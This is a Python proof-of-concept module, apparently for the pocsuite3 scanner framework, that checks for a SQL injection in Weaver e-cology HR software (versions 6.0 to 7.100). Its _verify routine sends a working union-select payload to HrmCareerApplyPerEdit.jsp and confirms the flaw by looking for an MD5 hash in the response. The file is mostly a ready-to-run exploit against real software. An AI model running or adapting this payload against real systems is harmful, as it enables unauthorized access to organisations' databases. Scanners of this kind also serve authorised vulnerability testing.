#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''泛微e-cology_HrmCareerApplyPerEdit_sqli'''
    desc = '''版本：6.0，7.0，7.100'''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''E-cology'''
    appVersion = '''all'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        verify_url = make_verify_url(self.url, "/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%27123%27%29%29%2C5%2C6%2C7", mod=0)
        resp = requests.get(verify_url, verify=False, timeout=15, allow_redirects=False)
        if b"202cb962ac59075b964b07152d234b70" in resp.content and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)
